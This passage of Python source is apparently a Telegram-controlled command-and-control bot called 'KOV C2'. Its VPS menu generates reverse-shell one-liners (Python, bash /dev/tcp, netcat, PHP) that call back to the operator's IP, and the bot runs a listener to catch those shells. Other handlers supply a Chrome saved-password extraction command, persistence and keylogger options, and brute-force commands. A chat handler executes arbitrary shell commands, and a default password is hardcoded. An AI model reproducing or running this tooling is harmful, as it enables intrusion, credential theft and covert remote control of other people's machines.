    await query.answer()
    data = query.data
    user_id = update.effective_user.id
    if is_banned(user_id):
        await query.edit_message_text("🚫 Banned", parse_mode=ParseMode.MARKDOWN)
        return
    if data == "start_login":
        await query.edit_message_text(f"{BOX}\n🔐 LOGIN\n{BOX}\n\nEnter password:", parse_mode=ParseMode.MARKDOWN, reply_markup=build_cancel_keyboard())
        return
    if data == "start_about":
        msg = f"{BOX}\n🔥 KOV C2\n{BOX}\n\nVersion: 3.0\nDeveloper: D4RK-K1NG\nPlatform: {platform.system()}\n\n🎯 Target Management\n💻 Shell\n🔍 Scanner\n💉 Payloads\n🌐 VPS Connect\n📸 Screenshot\n🔑 Browser Pass\n📶 WiFi\n🔨 Brute Force\n\nAuthorized testing only"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_start_keyboard())
        return
    if not is_authenticated(context, user_id):
        await query.edit_message_text("🔐 Login first", parse_mode=ParseMode.MARKDOWN, reply_markup=build_start_keyboard())
        return
    context.user_data['authenticated'] = True
    update_user_last_seen(user_id)
    if data == "menu_logout":
        context.user_data['authenticated'] = False
        context.user_data['shell_target'] = None
        await query.edit_message_text(f"{BOX}\n🔐 Logged out\n{BOX}", parse_mode=ParseMode.MARKDOWN, reply_markup=build_start_keyboard())
        return
    if data == "menu_back":
        nickname = get_user_nickname(user_id) or update.effective_user.full_name
        role = "👑 OWNER" if is_owner(user_id) else "🛡️ ADMIN" if is_admin(user_id) else "👤 USER"
        await query.edit_message_text(f"{BOX}\n📋 MAIN MENU\n{BOX}\n\n{nickname}\nRole: {role}", parse_mode=ParseMode.MARKDOWN, reply_markup=build_main_menu(is_owner(user_id)))
        return
    if data == "menu_admin":
        if not is_owner(user_id):
            await query.edit_message_text("❌ Access Denied", parse_mode=ParseMode.MARKDOWN)
            return
        await query.edit_message_text(f"{BOX}\n⚙ ADMIN PANEL\n{BOX}", parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
        return
    if data == "menu_vps":
        public_ip = get_public_ip()
        port = 4444
        msg = (
            f"{BOX}\n🌐 VPS CONNECT\n{BOX}\n\n"
            f"🌍 Public IP: `{public_ip}`\n💻 Hostname: `{socket.gethostname()}`\n\n"
            f"Payloads (Port {port}):\n\n"
            f"1️⃣ Python:\n```\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{public_ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n```\n\n"
            f"2️⃣ Bash:\n```\nbash -i >& /dev/tcp/{public_ip}/{port} 0>&1\n```\n\n"
            f"3️⃣ Netcat:\n```\nnc -e /bin/sh {public_ip} {port}\n```\n\n"
            f"4️⃣ PHP:\n```\n<?php\n$sock=fsockopen(\"{public_ip}\",{port});\nexec(\"/bin/sh -i <&3 >&3 2>&3\");\n?>\n```\n\n"
            f"🎧 Listener: {'🟢 Running' if context.bot_data.get('listener_running') else '🔴 Stopped'}\n"
            f"{BOX}"
        )
        keyboard = [
            [InlineKeyboardButton("🎧 START LISTENER", callback_data=f"vps_listener:{port}"),
             InlineKeyboardButton("⏹ STOP", callback_data="vps_stop")],
            [InlineKeyboardButton("🔙 MAIN MENU", callback_data="menu_back")]
        ]
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    if data.startswith("vps_listener:"):
        port = int(data.split(":")[1])
        if context.bot_data.get('listener_running'):
            await query.edit_message_text(f"🔴 Already running on port {context.bot_data.get('listener_port')}", parse_mode=ParseMode.MARKDOWN)
            return
        await query.edit_message_text(f"🎧 Listener started on port {port}", parse_mode=ParseMode.MARKDOWN)
        def start_vps_listener():
            context.bot_data['listener_running'] = True
            context.bot_data['listener_port'] = port
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                server.bind(('0.0.0.0', port))
                server.listen(5)
                server.settimeout(1.0)
                while context.bot_data.get('listener_running'):
                    try:
                        client, addr = server.accept()
                        t = threading.Thread(target=handle_connection, args=(client, addr, context))
                        t.daemon = True
                        t.start()
                    except socket.timeout:
                        continue
                    except:
                        break
            except:
                pass
            finally:
                server.close()
                context.bot_data['listener_running'] = False
        t = threading.Thread(target=start_vps_listener, daemon=True)
        t.start()
        context.bot_data['listener_thread'] = t
        return
    if data == "vps_stop":
        if context.bot_data.get('listener_running'):
            context.bot_data['listener_running'] = False
            await query.edit_message_text("⏹️ Listener stopped", parse_mode=ParseMode.MARKDOWN)
        else:
            await query.edit_message_text("📭 No listener", parse_mode=ParseMode.MARKDOWN)
        return
    if data in ("admin_add", "admin_remove", "admin_ban", "admin_unban"):
        return
    if data == "admin_list_admins":
        admins = get_admins()
        msg = f"{BOX}\n👥 ADMINS\n{BOX}\n"
        for a in admins:
            n = get_user_nickname(a) or "Unknown"
            t = " 👑" if a == ADMIN_ID else ""
            msg += f"  • `{a}` ({n}){t}\n"
        msg += f"\nTotal: `{len(admins)}`"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
        return
    if data == "admin_users_list":
        users = get_users()
        if not users:
            await query.edit_message_text("📭 No users", parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
            return
        msg = f"{BOX}\n👤 USERS\n{BOX}\n"
        for u in users:
            t = " 👑" if is_owner(u['user_id']) else " 🛡️" if is_admin(u['user_id']) else ""
            b = " 🚫" if is_banned(u['user_id']) else ""
            msg += f"  • `{u['user_id']}` ({u['nickname']}){t}{b}\n"
        msg += f"\nTotal: `{len(users)}`"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
        return
    if data == "admin_reset":
        kb = [[InlineKeyboardButton("✅ YES", callback_data="reset_confirm")], [InlineKeyboardButton("❌ NO", callback_data="admin_cancel")]]
        await query.edit_message_text(f"{BOX}\n⚠️ RESET BOT?\n{BOX}\n\nDeletes everything except owner.\nPassword -> d4rk123", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))
        return
    if data == "reset_confirm":
        if not is_owner(user_id):
            await query.edit_message_text("❌ Denied", parse_mode=ParseMode.MARKDOWN)
            return
        conn = get_db()
        c = conn.cursor()
        for tbl in ["targets","sessions","commands","files","credentials"]:
            c.execute(f"DELETE FROM {tbl}")
        conn.commit()
        conn.close()
        save_json(ADMINS_PATH, [ADMIN_ID])
        save_json(BANNED_PATH, [])
        save_json(USERS_PATH, [])
        save_json(LOGS_PATH, [])
        save_json(NOTIFIED_PATH, [])
        set_password("d4rk123")
        await query.edit_message_text(f"{BOX}\n✅ RESET DONE\n{BOX}\n\nRe-login with d4rk123", parse_mode=ParseMode.MARKDOWN)
        return
    if data == "admin_cancel":
        await query.edit_message_text(f"{BOX}\n⚙ ADMIN PANEL\n{BOX}", parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
        return
    if data in ("admin_view_config","admin_change_pass","admin_logs","admin_dashboard","admin_notifications","admin_backup"):
        handlers = {
            "admin_view_config": admin_view_config,
            "admin_change_pass": admin_change_pass_start,
            "admin_logs": admin_logs,
            "admin_dashboard": admin_dashboard,
            "admin_notifications": admin_notifications,
            "admin_backup": admin_backup
        }
        await handlers[data](update, context)
        return
    menu_nav = {
        "menu_targets": ("🎯 TARGETS\n\n/targets - List\n/addtarget <host> <ip> - Add\n/removetarget <id> - Remove", build_back_keyboard()),
        "menu_shell": ("💻 SHELL\n\n/shell <id> - Interactive shell\n/cmd <id> <cmd> - Execute command", build_back_keyboard()),
        "menu_scan": ("🔍 SCANNER\n\n/scan <id> [ports] - Port scan\n/nmap <target> [args] - Nmap\n/osint <target> - OSINT", build_back_keyboard()),
        "menu_files": ("📁 FILES\n\n/upload <id> - Upload\n/listfiles <id> - List", build_back_keyboard()),
        "menu_payloads": ("💉 PAYLOADS\n\n/payload <host> <port> [os] - Generate\n/vps - VPS quick connect", build_back_keyboard()),
        "menu_listener": ("🎧 LISTENER\n\n/listener <port> - Start\n/stoplistener - Stop\n/connect <port> - Auto VPS", build_back_keyboard()),
        "menu_postex": ("🧰 POST-EXPLOIT\n\n/keylogger <id>\n/screenshot <id>\n/persistence <id>\n/browserpass <id>\n/wifi <id>", build_back_keyboard()),
        "menu_brute": ("🔨 BRUTE FORCE\n\n/brute <target> <user> <wordlist>", build_back_keyboard()),
        "menu_info": ("🖥 SYSTEM INFO\n\n/info - Display system info", build_back_keyboard()),
        "menu_status": ("📊 STATUS\n\n/status - Display bot statistics", build_back_keyboard()),
        "menu_help": (f"{BOX}\n📖 HELP\n{BOX}\n\n/login <pass>\n/setpass <pass>\n/menu\n/targets\n/addtarget <host> <ip>\n/removetarget <id>\n/shell <id>\n/cmd <id> <cmd>\n/scan <id> [ports]\n/nmap <target> [args]\n/osint <target>\n/upload <id>\n/listfiles <id>\n/screenshot <id>\n/persistence <id>\n/browserpass <id>\n/wifi <id>\n/keylogger <id>\n/brute <target> <user> <wordlist>\n/payload <host> <port> [os]\n/listener <port>\n/stoplistener\n/vps\n/connect <port>\n/info\n/status\n/cleanup\n\nDeveloper: D4RK-K1NG", None),
    }
    if data in menu_nav:
        msg, kb = menu_nav[data]
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
        return
    if data.startswith("target:"):
        target_id = data.split(":")[1]
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT * FROM targets WHERE id = ?", (target_id,))
        target = c.fetchone()
        conn.close()
        if not target:
            await query.edit_message_text("❌ Not found", parse_mode=ParseMode.MARKDOWN)
            return
        msg = f"{BOX}\n🎯 {target['hostname']}\n{BOX}\n🌐 IP: `{target['ip']}`\n💻 OS: {target['os'] or 'Unknown'}\n📅 Last: {target['last_seen']}"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_target_actions_keyboard(target_id))
        return
    if data.startswith("shell:"):
        target_id = data.split(":")[1]
        context.user_data['shell_target'] = target_id
        await query.edit_message_text(f"💻 Shell Mode\nTarget: `{target_id}`\nUse exit to close.", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return
    if data.startswith("scan:"):
        target_id = data.split(":")[1]
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT ip FROM targets WHERE id = ?", (target_id,))
        target = c.fetchone()
        conn.close()
        if not target:
            await query.edit_message_text("❌ Not found", parse_mode=ParseMode.MARKDOWN)
            return
        await query.edit_message_text(f"🔍 Scanning {target['ip']}...", parse_mode=ParseMode.MARKDOWN)
        results = network_scan(target['ip'])
        if not results:
            await query.edit_message_text("📭 No open ports", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
            return
        msg = f"🔍 Results - {target['ip']}\n"
        for r in results[:15]:
            msg += f"  ├ PORT `{r['port']}` - {r['service']}\n"
        if len(results) > 15:
            msg += f"  └ ... +{len(results)-15} more"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return
    if data.startswith("remove:"):
        tid = data.split(":")[1]
        conn = get_db()
        c = conn.cursor()
        for t in ["targets","sessions","commands","files","credentials"]:
            c.execute(f"DELETE FROM {t} WHERE target_id = ?", (tid,))
        conn.commit()
        conn.close()
        await query.edit_message_text(f"✅ Target `{tid}` removed", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return
    if data.startswith("listfiles:"):
        target_id = data.split(":")[1]
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT * FROM files WHERE target_id = ? ORDER BY exfiltrated_at DESC", (target_id,))
        files = c.fetchall()
        conn.close()
        if not files:
            await query.edit_message_text("📭 No files", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
            return
        msg = "📁 Files\n"
        for f in files:
            size = f"{f['size']/1024:.1f} KB" if f['size'] else "Unknown"
            msg += f"\n  📄 `{f['filename']}` - {size}"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return
    if data.startswith("browserpass:"):
        await query.edit_message_text("🔑 Browser Passwords\n\nChrome:\n```\npython3 -c \"import sqlite3,os; p=os.path.expanduser('~/.config/google-chrome/Default/Login Data'); c=sqlite3.connect(p); for r in c.execute('SELECT origin_url,username_value,password_value FROM logins'): print(r[0],r[1],r[2])\"```", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return
    if data.startswith("persist:"):
        await query.edit_message_text(f"🔗 Persistence Script\n```\n{generate_persistence_script()}\n```\nReplace LHOST and LPORT.", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return
    if data.startswith("screenshot:"):
        await query.edit_message_text("📸 Taking screenshot...", parse_mode=ParseMode.MARKDOWN)
        try:
            img_path = f"/tmp/d4rk_ss_{int(time.time())}.png"
            result = subprocess.run(["scrot", img_path], capture_output=True, timeout=10)
            if os.path.exists(img_path):
                with open(img_path, 'rb') as f:
                    await query.message.reply_photo(photo=InputFile(f, filename="screenshot.png"), caption="📸 Screenshot", parse_mode=ParseMode.MARKDOWN)
                os.remove(img_path)
            else:
                await query.edit_message_text("❌ Screenshot failed", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        except:
            await query.edit_message_text("❌ Screenshot not available", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return
    if data.startswith("wifi:"):
        await query.edit_message_text("📶 WiFi Networks", parse_mode=ParseMode.MARKDOWN)
        try:
            result = subprocess.run(["nmcli", "dev", "wifi", "list"], capture_output=True, text=True, timeout=10)
            output = result.stdout[:3500] if result.returncode == 0 else "No WiFi interfaces"
        except:
            output = "Requires nmcli"
        await query.edit_message_text(f"📶 Networks\n```\n{output}\n```", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return
    if data.startswith("keylogger:"):
        await query.edit_message_text("⌨️ Keylogger Simulated\nUse /cmd to execute on target.", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return

async def handle_message(update, context):
    user_id = update.effective_user.id
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.", parse_mode=ParseMode.MARKDOWN)
        return
    if not is_authenticated(context, user_id):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    text = update.message.text
    update_user_last_seen(user_id)
    shell_target = context.user_data.get('shell_target')
    if shell_target:
        if text.lower() == 'exit':
            context.user_data['shell_target'] = None
            await update.message.reply_text("💻 Shell closed", parse_mode=ParseMode.MARKDOWN)
            return
        try:
            result = subprocess.run(text, shell=True, capture_output=True, text=True, timeout=60)
            output = result.stdout + result.stderr
            if not output:
                output = "[No output]"
            if len(output) > 3500:
                output = output[:3500] + "\n\n...[truncated]..."
            await update.message.reply_text(f"```\n{output}\n```", parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            await update.message.reply_text(f"❌ `{str(e)}`", parse_mode=ParseMode.MARKDOWN)
        return
    await update.message.reply_text(f"📩 `{text[:50]}...`\nUse /help", parse_mode=ParseMode.MARKDOWN)

def main():
    init_db()
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("setpass", setpass))
    application.add_handler(CommandHandler("menu", menu))
    application.add_handler(CommandHandler("help", help_cmd))
    application.add_handler(CommandHandler("admin", admin_panel))
    application.add_handler(CommandHandler("addadmin", add_admin_cmd))
    application.add_handler(CommandHandler("removeadmin", remove_admin_cmd))
    application.add_handler(CommandHandler("ban", ban_cmd))
    application.add_handler(CommandHandler("unban", unban_cmd))
    application.add_handler(CommandHandler("listadmins", list_admins_cmd))
    application.add_handler(CommandHandler("banlist", ban_list_cmd))
    application.add_handler(CommandHandler("users", users_list_cmd))
    application.add_handler(CommandHandler("reset", reset_bot))
    application.add_handler(CommandHandler("targets", targets))
    application.add_handler(CommandHandler("addtarget", add_target))
    application.add_handler(CommandHandler("removetarget", remove_target))
    application.add_handler(CommandHandler("shell", shell))
    application.add_handler(CommandHandler("cmd", cmd))
    application.add_handler(CommandHandler("scan", scan))
    application.add_handler(CommandHandler("nmap", nmap_wrapper))
    application.add_handler(CommandHandler("osint", osint))
    application.add_handler(CommandHandler("listfiles", list_files))
    application.add_handler(CommandHandler("keylogger", keylogger))
    application.add_handler(CommandHandler("screenshot", screenshot))
    application.add_handler(CommandHandler("persistence", persistence))
    application.add_handler(CommandHandler("browserpass", browserpass))
    application.add_handler(CommandHandler("wifi", wifi_enum))
    application.add_handler(CommandHandler("brute", brute))
    application.add_handler(CommandHandler("listener", listener))
    application.add_handler(CommandHandler("stoplistener", stop_listener))
    application.add_handler(CommandHandler("payload", payload))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("cleanup", cleanup))
    application.add_handler(CommandHandler("vps", vps_connect))
    application.add_handler(CommandHandler("connect", connect_cmd))

    login_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(login_button_click, pattern="^start_login$"), CommandHandler("login", login_cmd)],
        states={AUTH_PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_password_receive)], NICKNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_nickname_receive)]},
        fallbacks=[CallbackQueryHandler(login_cancel, pattern="^admin_cancel$"), CommandHandler("cancel", login_cancel)],
        per_message=False
    )
    application.add_handler(login_conv)

    upload_conv = ConversationHandler(
        entry_points=[CommandHandler("upload", upload_file_start)],
        states={FILE_UPLOAD: [MessageHandler(filters.ALL, upload_file_receive)]},
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    application.add_handler(upload_conv)

    custom_cmd_conv = ConversationHandler(
        entry_points=[CommandHandler("run", custom_cmd_start)],
        states={CUSTOM_CMD: [MessageHandler(filters.TEXT & ~filters.COMMAND, custom_cmd_receive)]},
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    application.add_handler(custom_cmd_conv)

    admin_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_action_start, pattern="^(admin_add|admin_remove|admin_ban|admin_unban)$")],
        states={ADMIN_ACTION_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_action_receive)]},
        fallbacks=[CallbackQueryHandler(admin_action_cancel, pattern="^admin_cancel$"), CommandHandler("cancel", admin_action_cancel)],
        per_message=False
    )
    application.add_handler(admin_conv)

    change_pass_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_change_pass_start, pattern="^admin_change_pass$")],
        states={ADMIN_CHANGE_PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_change_pass_receive)]},
        fallbacks=[CallbackQueryHandler(admin_action_cancel, pattern="^admin_cancel$"), CommandHandler("cancel", admin_action_cancel)],
        per_message=False
    )
    application.add_handler(change_pass_conv)

    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    async def error_handler(update, context):
        print(f"[ERROR] {context.error}")
    application.add_error_handler(error_handler)

    print("")
    print("    ╔═══════════════════════════════════════╗")
    print("    ║     KOV C2 SARVER v3.0               ║")
    print("    ║     Developer: D4RK-K1NG              ║")
    print("    ║     VPS Connect Ready                 ║")
    print("    ╚═══════════════════════════════════════╝")
    print(f"[*] Started: {datetime.now()}")
    print(f"[*] DB: {DB_PATH}")
    print(f"[*] Admin ID: {ADMIN_ID}")

    application.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False, stop_signals=None)

def start_bot():
    init_db()
    main()

if __name__ == "__main__":
    threading.Thread(target=start_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
